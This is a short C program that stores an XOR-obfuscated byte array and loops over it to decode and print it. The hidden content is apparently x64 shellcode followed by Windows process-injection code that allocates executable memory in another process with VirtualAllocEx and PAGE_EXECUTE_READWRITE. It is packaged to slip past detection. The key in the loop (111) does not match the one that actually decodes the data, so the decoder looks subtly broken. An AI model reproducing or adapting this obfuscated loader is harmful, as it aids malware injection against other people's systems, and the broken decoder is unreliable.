#include <stdio.h>

int main()
{

unsigned char test[] = "\x8d\xf3\xd7\xc9\xcc\xf3\xd7\x9b\x97\xf3\xd7\x97\x9c\xf3\xd7\xca\x9b\xf3\xd7\xc9\x9f\xf3\xd7\xca\x97\xf3\xd7\xcc\x9f\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9e\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9f\x8d\xa5\x8d\xf3\xd7\x9a\x9d\xf3\xd7\x9a\x9e\xf3\xd7\x9a\x99\xf3\xd7\x9b\x97\xf3\xd7\x9c\x9e\xf3\xd7\xcb\x9d\xf3\xd7\x99\x9a\xf3\xd7\x9b\x97\xf3\xd7\x97\xcd\xf3\xd7\x9a\x9d\xf3\xd7\x99\x9f\xf3\xd7\x9b\x97\xf3\xd7\x97\xcd\xf3\xd7\x9a\x9d\x8d\xa5\x8d\xf3\xd7\x9e\x97\xf3\xd7\x9b\x97\xf3\xd7\x97\xcd\xf3\xd7\x9a\x9d\xf3\xd7\x9d\x9f\xf3\xd7\x9b\x97\xf3\xd7\x97\xcd\xf3\xd7\x98\x9d\xf3\xd7\x9a\x9f\xf3\xd7\x9b\x97\xf3\xd7\x9f\xc9\xf3\xd7\xcd\x98\xf3\xd7\x9b\xce\xf3\xd7\x9b\xce\x8d\xa5\x8d\xf3\xd7\x9b\xcb\xf3\xd7\x9c\x9e\xf3\xd7\xcc\x96\xf3\xd7\x9b\x97\xf3\xd7\x9c\x9e\xf3\xd7\xcc\x9f\xf3\xd7\xce\xcc\xf3\xd7\x9c\xcc\xf3\xd7\x99\x9e\xf3\xd7\x98\xcc\xf3\xd7\x9f\x9d\xf3\xd7\x9d\xcc\xf3\xd7\x9d\x9f\xf3\xd7\x9b\x9e\x8d\xa5\x8d\xf3\xd7\xcc\x9e\xf3\xd7\xcc\x96\xf3\xd7\x9f\xcb\xf3\xd7\x9b\x9e\xf3\xd7\x9f\x9e\xf3\xd7\xcc\x9e\xf3\xd7\xca\x9d\xf3\xd7\xca\xcb\xf3\xd7\x9a\x9d\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9e\xf3\xd7\x9b\x97\xf3\xd7\x97\xcd\xf3\xd7\x9a\x9d\x8d\xa5\x8d\xf3\xd7\x9d\x9f\xf3\xd7\x97\xcd\xf3\xd7\x9b\x9d\xf3\xd7\x9c\xcc\xf3\xd7\x9b\x97\xf3\xd7\x9f\x9e\xf3\xd7\xcb\x9f\xf3\xd7\x97\xcd\xf3\xd7\x97\x9f\xf3\xd7\x97\x97\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9f\xf3\xd7\x9b\x97\x8d\xa5\x8d\xf3\xd7\x97\x9a\xf3\xd7\xcc\x9f\xf3\xd7\x98\x9b\xf3\xd7\x99\x98\xf3\xd7\x9b\x97\xf3\xd7\x9f\x9e\xf3\xd7\xcb\x9f\xf3\xd7\x9a\x9f\xf3\xd7\x97\xcd\xf3\xd7\x9b\x97\xf3\xd7\x9e\x97\xf3\xd7\x9b\x9b\xf3\xd7\x97\xcd\xf3\xd7\x9b\x9f\x8d\xa5\x8d\xf3\xd7\x9d\x9f\xf3\xd7\x9b\x96\xf3\xd7\x9f\x9e\xf3\xd7\xcb\x9f\xf3\xd7\xca\x9c\xf3\xd7\x9a\x99\xf3\xd7\x9b\x97\xf3\xd7\xc9\xc9\xf3\xd7\xcc\x96\xf3\xd7\x9b\x9e\xf3\xd7\x97\xcd\xf3\xd7\x9c\x9b\xf3\xd7\x97\x97\xf3\xd7\x9b\x97\x8d\xa5\x8d\xf3\xd7\x9f\x9e\xf3\xd7\xcb\x99\xf3\xd7\x9b\xcb\xf3\xd7\x9c\x9e\xf3\xd7\xcc\x96\xf3\xd7\x9b\x97\xf3\xd7\x9c\x9e\xf3\xd7\xcc\x9f\xf3\xd7\xce\xcc\xf3\xd7\x9b\x9e\xf3\xd7\xcc\x9e\xf3\xd7\xcc\x96\xf3\xd7\x9f\xcb\xf3\xd7\x9b\x9e\x8d\xa5\x8d\xf3\xd7\x9f\x9e\xf3\xd7\xcc\x9e\xf3\xd7\x9c\x97\xf3\xd7\xca\x9f\xf3\xd7\x98\x9a\xf3\xd7\xc9\x9e\xf3\xd7\x9b\xcc\xf3\xd7\x9f\x9c\xf3\xd7\x9b\xcc\xf3\xd7\x9d\x9b\xf3\xd7\x9f\x97\xf3\xd7\x9b\x9a\xf3\xd7\x9c\x96\xf3\xd7\xcb\x9e\x8d\xa5\x8d\xf3\xd7\x98\x9a\xf3\xd7\xcb\x97\xf3\xd7\x9a\x97\xf3\xd7\x9b\x9b\xf3\xd7\x97\xcd\xf3\xd7\x9b\x9f\xf3\xd7\x9d\x9b\xf3\xd7\x9b\x96\xf3\xd7\x9f\x9e\xf3\xd7\xcb\x9f\xf3\xd7\x99\x99\xf3\xd7\x9b\x9e\xf3\xd7\x97\xcd\xf3\xd7\x9f\xcc\x8d\xa5\x8d\xf3\xd7\x9b\x97\xf3\xd7\x9b\x9b\xf3\xd7\x97\xcd\xf3\xd7\x9b\x9f\xf3\xd7\x9e\xcc\xf3\xd7\x9b\x96\xf3\xd7\x9f\x9e\xf3\xd7\xcb\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x97\xcd\xf3\xd7\x9f\x9b\xf3\xd7\x97\x97\xf3\xd7\x9b\x97\xf3\xd7\x9f\x9e\x8d\xa5\x8d\xf3\xd7\xcb\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x97\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x97\xf3\xd7\x9a\xca\xf3\xd7\x9a\x96\xf3\xd7\x9a\xce\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x97\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x96\xf3\xd7\x9b\x9e\xf3\xd7\x9a\xce\x8d\xa5\x8d\xf3\xd7\x9b\x97\xf3\xd7\x97\x9c\xf3\xd7\xca\xcc\xf3\xd7\x9d\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9d\xf3\xd7\xc9\xc9\xf3\xd7\xca\x9f\xf3\xd7\x9a\x97\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x96\xf3\xd7\x9a\xce\xf3\xd7\x9b\x97\xf3\xd7\x97\xcd\x8d\xa5\x8d\xf3\xd7\x9e\x9d\xf3\xd7\xca\x96\xf3\xd7\x9a\x98\xf3\xd7\xc9\xc9\xf3\xd7\xc9\xc9\xf3\xd7\xc9\xc9\xf3\xd7\x9a\xcb\xf3\xd7\x9b\x96\xf3\xd7\xcd\xca\xf3\xd7\x98\x98\xf3\xd7\x98\x9c\xf3\xd7\x9c\x9d\xf3\xd7\x9a\xc9\xf3\xd7\x9c\x9c\x8d\xa5\x8d\xf3\xd7\x9c\x9d\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x99\xf3\xd7\x9b\x96\xf3\xd7\x97\x96\xf3\xd7\xca\x99\xf3\xd7\x9b\x97\xf3\xd7\x97\x9e\xf3\xd7\xca\xcc\xf3\xd7\xce\x9f\xf3\xd7\x9f\x9e\xf3\xd7\x9f\x9f\x8d\xa5\x8d\xf3\xd7\x9f\x9f\xf3\xd7\x9b\x96\xf3\xd7\x97\x96\xf3\xd7\xca\x9a\xf3\xd7\x9b\x96\xf3\xd7\xcd\xcc\xf3\xd7\x9f\x9d\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9a\xf3\xd7\x9c\x96\xf3\xd7\xcd\xca\xf3\xd7\x99\x9b\xf3\xd7\x9c\xcc\xf3\xd7\xcc\x96\x8d\xa5\x8d\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9b\xf3\xd7\x9b\x96\xf3\xd7\x97\x96\xf3\xd7\xca\x9b\xf3\xd7\x9b\xcc\xf3\xd7\x97\x96\xf3\xd7\xc9\x9e\xf3\xd7\x9b\x9e\xf3\xd7\xcd\xce\xf3\xd7\x9b\xcc\xf3\xd7\x98\x98\xf3\xd7\x9d\x99\xf3\xd7\x9f\x98\x8d\xa5\x8d\xf3\xd7\xc9\xc9\xf3\xd7\xcb\x9a\xf3\xd7\x9b\xcc\xf3\xd7\x97\x96\xf3\xd7\xca\xce\xf3\xd7\x99\x97\xf3\xd7\x9f\x9e\xf3\xd7\x9f\x9e\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9f\xf3\xd7\x9a\x96\xf3\xd7\x9b\x9e\xf3\xd7\xcd\xce\xf3\xd7\x9d\x96\x8d\xa5\x8d\xf3\xd7\x97\x9f\xf3\xd7\x99\xcd\xf3\xd7\x9f\x9f\xf3\xd7\xc9\xc9\xf3\xd7\xcb\x9a\xf3\xd7\x9a\x9f\xf3\xd7\x9a\x9f\xf3\xd7\x9b\xcb\xf3\xd7\x9c\x9e\xf3\xd7\xcc\x96\xf3\xd7\x9b\xcb\xf3\xd7\x9c\x9e\xf3\xd7\xcc\x9f\xf3\xd7\x9b\x97\x8d\xa5\x8d\xf3\xd7\xc9\xc9\xf3\xd7\xcc\x9f\xf3\xd7\x9b\x97\xf3\xd7\x97\x96\xf3\xd7\xcc\x9d\xf3\xd7\x9b\x97\xf3\xd7\xc9\xc9\xf3\xd7\xcc\x9f\xf3\xd7\x9b\x97\xf3\xd7\x97\x96\xf3\xd7\xcc\x9e\xf3\xd7\x9b\x9e\xf3\xd7\xcd\xce\xf3\xd7\xca\xce\x8d\xa5\x8d\xf3\xd7\x9f\xc9\xf3\xd7\xcb\xc9\xf3\xd7\xca\x9f\xf3\xd7\xc9\xc9\xf3\xd7\xcb\x9a\xf3\xd7\x9b\x97\xf3\xd7\x97\x96\xf3\xd7\xcc\x98\xf3\xd7\x99\xce\xf3\xd7\x9e\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x97\xf3\xd7\x9b\xcc\xf3\xd7\x97\x96\x8d\xa5\x8d\xf3\xd7\xca\x9d\xf3\xd7\x9b\x97\xf3\xd7\x97\x96\xf3\xd7\xc9\x96\xf3\xd7\x9b\x9e\xf3\xd7\xcd\xce\xf3\xd7\x96\x96\xf3\xd7\xce\x9a\xf3\xd7\x98\x9b\xf3\xd7\x99\x9e\xf3\xd7\xc9\xc9\xf3\xd7\xcb\x9a\xf3\xd7\x9b\x97\xf3\xd7\x97\x9e\x8d\xa5\x8d\xf3\xd7\xcc\x9b\xf3\xd7\x9b\x9f\xf3\xd7\x9f\x9d\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9f\xf3\xd7\x9b\x96\xf3\xd7\xcd\x97\xf3\xd7\x99\x9c\xf3\xd7\x99\xcb\xf3\xd7\x99\x9b\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9f\xf3\xd7\x9f\x9f\x8d\xa5\x8d\xf3\xd7\x9f\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9f\xf3\xd7\x9b\x97\xf3\xd7\x97\x96\xf3\xd7\xca\x9d\xf3\xd7\x9a\x98\xf3\xd7\x9a\x98\xf3\xd7\x9a\x98\xf3\xd7\x9b\xcb\xf3\xd7\x9c\x9e\xf3\xd7\xcc\x9f\x8d\xa5\x8d\xf3\xd7\x99\xce\xf3\xd7\x9f\xcb\xf3\xd7\x9a\x96\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9f\xf3\xd7\xca\x9d\xf3\xd7\xc9\xcc\xf3\xd7\x99\x99\xf3\xd7\xcc\x98\xf3\xd7\x9b\x9b\xf3\xd7\x9d\x9b\xf3\xd7\x9a\x9b\xf3\xd7\x9f\x9e\xf3\xd7\x9f\x9e\x8d\xa5\x8d\xf3\xd7\x9b\x97\xf3\xd7\x97\xcb\xf3\xd7\x9b\x9b\xf3\xd7\x9d\x9b\xf3\xd7\x9e\x97\xf3\xd7\xcc\x99\xf3\xd7\x9f\x9f\xf3\xd7\x99\x97\xf3\xd7\x9b\x97\xf3\xd7\x97\x96\xf3\xd7\xca\x99\xf3\xd7\x9a\x99\xf3\xd7\x9a\x9f\xf3\xd7\x9b\x9e\x8d\xa5\x8d\xf3\xd7\x9a\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9f\xf3\xd7\x9b\x96\xf3\xd7\xc9\xc9\xf3\xd7\xcc\x9f\xf3\xd7\x9b\x9e\xf3\xd7\x9a\x9f\xf3\xd7\x9b\x96\xf3\xd7\xc9\xc9\xf3\xd7\xcc\x97\xf3\xd7\x9b\xcb\x8d\xa5\x8d\xf3\xd7\x97\x96\xf3\xd7\xcc\x9e\xf3\xd7\x9b\xcc\xf3\xd7\x97\x96\xf3\xd7\xcc\x9e\xf3\xd7\x9b\x9e\xf3\xd7\xcd\xce\xf3\xd7\x98\x96\xf3\xd7\xcc\xcc\xf3\xd7\x9c\xc9\xf3\xd7\x97\x99\xf3\xd7\xc9\xc9\xf3\xd7\xcb\x9a\xf3\xd7\x9b\x97\x8d\xa5\x8d\xf3\xd7\x9c\x9e\xf3\xd7\xcb\x9d\xf3\xd7\x9b\x97\xf3\xd7\xc9\xc9\xf3\xd7\xcc\xce\xf3\xd7\x97\xcd\xf3\xd7\x9f\xca\xf3\xd7\x9b\x9e\xf3\xd7\xcd\xce\xf3\xd7\x9f\x97\xf3\xd7\x97\x98\xf3\xd7\x9e\xcb\xf3\xd7\x99\x9f\xf3\xd7\xc9\xc9\x8d\xa5\x8d\xf3\xd7\xcb\x9a\xf3\xd7\xcd\xcd\xf3\xd7\xc9\x9f\xf3\xd7\xcd\x9a\xf3\xd7\xce\x9d\xf3\xd7\x9a\x99\xf3\xd7\x9b\x9e\xf3\xd7\xcd\xce\xf3\xd7\xce\x99\xf3\xd7\x96\x9a\xf3\xd7\xcd\xcb\xf3\xd7\x96\xcb\xf3\xd7\xc9\xc9\xf3\xd7\xcb\x9a\x8d\xa5\x8d\xf3\xd7\x9b\x97\xf3\xd7\x97\x9c\xf3\xd7\xcc\x9b\xf3\xd7\x9d\x97\xf3\xd7\x9c\xcc\xf3\xd7\x9f\x99\xf3\xd7\x98\xcc\xf3\xd7\x9f\xce\xf3\xd7\x97\x9f\xf3\xd7\xc9\xcd\xf3\xd7\xca\x9f\xf3\xd7\x98\x9a\xf3\xd7\x9f\x9a\xf3\xd7\xcd\xcd\x8d\xa5\x8d\xf3\xd7\x9b\x98\xf3\xd7\x9e\x9c\xf3\xd7\x98\x9d\xf3\xd7\x99\xc9\xf3\xd7\x99\xce\xf3\xd7\x9f\x9f\xf3\xd7\x9a\x96\xf3\xd7\x9b\x9e\xf3\xd7\x97\x96\xf3\xd7\xcb\xce\xf3\xd7\xc9\xc9\xf3\xd7\xcb\x9a\x8d\xa5\xa5\x8f\x8f\x8f\x8f\xdc\xc6\xd5\xca\xf0\xdb\x8f\xdb\xca\xdc\xdb\xfc\xc6\xd5\xca\x8f\x92\x8f\xdc\xc6\xd5\xca\xc0\xc9\x87\xdb\xca\xdc\xdb\x86\x94\xa5\xa5\x8f\x8f\x8f\x8f\x80\x80\xec\xdd\xca\xce\xdb\xca\x8f\xce\x8f\xdc\xdf\xce\xcc\xca\x8f\xc9\xc0\xdd\x8f\xc0\xda\xdd\x8f\xdf\xdd\xc0\xcc\xca\xdc\xdc\x8f\xdb\xc0\x8f\xca\xd7\xc6\xdc\xdb\x8f\xc6\xc1\x8f\xa5\x8f\x8f\x8f\x8f\xdd\xed\xda\xc9\xc9\xca\xdd\x8f\x92\x8f\xf9\xc6\xdd\xdb\xda\xce\xc3\xee\xc3\xc3\xc0\xcc\xea\xd7\x87\xc7\xff\xdd\xc0\xcc\xca\xdc\xdc\x83\x8f\xe1\xfa\xe3\xe3\x83\x8f\xdb\xca\xdc\xdb\xfc\xc6\xd5\xca\x83\x8f\x87\xe2\xea\xe2\xf0\xfd\xea\xfc\xea\xfd\xf9\xea\x8f\xd3\x8f\xe2\xea\xe2\xf0\xec\xe0\xe2\xe2\xe6\xfb\x86\x83\x8f\xff\xee\xe8\xea\xf0\xea\xf7\xea\xec\xfa\xfb\xea\xf0\xfd\xea\xee\xeb\xf8\xfd\xe6\xfb\xea\x86\x94\x8f\x80\x80\x8f\x87\xe2\xea\xe2\xf0\xfd\xea\xfc\xea\xfd\xf9\xea\x8f\xd3\x8f\xe2\xea\xe2\xf0\xec\xe0\xe2\xe2\xe6\xfb\x86\x8f\xce\xc3\xc3\xc0\xd8\xdc\x8f\xd6\xc0\xda\x8f\xdb\xc0\x8f\xcb\xc0\x8f\xcd\xc0\xdb\xc7\xa5\x8f\x8f\x8f\x8f\x80\x80\xe2\xce\xc4\xc6\xc1\xc8\x8f\xdf\xca\xdd\xc2\xc6\xdc\xdc\xc6\xc0\xc1\x8f\xdd\xd8\x8f\xc9\xc6\xdd\xdc\xdb\x8f\xdb\xc7\xca\xc1\x8f\xc0\xc1\xcc\xca\x8f\xc6\xdb\x8f\xc6\xdc\x8f\xca\xdc\xdb\xce\xcd\xc3\xc6\xdc\xc7\xca\xcb\x8f\x87\xc2\xce\xcb\xca\x86\x83\x8f\xda\xdc\xca\x8f\xd9\xc6\xdd\xdb\xda\xce\xc3\xdf\xdd\xc0\xdb\xca\xcc\xdb\x87\x86\x8f\xdb\xc0\x8f\xc2\xce\xc4\xca\x8f\xc6\xdb\x8f\xdd\xca\xce\xcb\x8f\xd8\xdd\xc6\xdb\xca\x8f\xca\xd7\xca\xcc\xda\xdb\xca\xa5\x8f\x8f\x8f\x8f\x80\x80\xfa\xdc\xca\x8f\xcb\xc0\xcc\xda\xc2\xca\xc1\xce\xdb\xc6\xc0\xc1\x8f\xdb\xc0\x8f\xcb\xc0\x8f\xdb\xc7\xc6\xdc\x8f\xd8\xc6\xdb\xc7\x8f\xd9\xc6\xdd\xdb\xda\xce\xc3\x8f\xdf\xdd\xc0\xdb\xca\xcc\xdb";
    
    int key = 111;
    int i = 0;
    for (i; i<sizeof(test) - 2; i++) //Need to remove the last element becasue of null terminator
    {
        test[i] = test[i]^key;
        printf("\\x%02x",test[i]);
    }
}